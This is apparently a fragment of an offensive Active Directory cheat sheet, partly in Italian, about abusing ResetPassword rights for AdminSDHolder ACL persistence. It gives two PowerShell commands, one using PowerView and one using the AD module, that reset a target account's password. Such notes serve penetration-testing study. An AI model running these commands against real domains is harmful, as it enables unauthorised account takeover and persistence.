# Persistence using ACLs - Abusing - AdminSDHolder2

#### Abusing ResetPassword&#x20;

* utilizzando PowerView

```powershell
Set-DomainUserPassword -Identity testda -AccountPassword 
(ConvertTo-SecureString "Password@123" -AsPlainText -
Force) -Verbose
```

* utilizzando Active-Directory Module

```powershell
Set-ADAccountPassword -Identity testda -NewPassword 
(ConvertTo-SecureString "Password@123" -AsPlainText -
Force) -Verbose
```
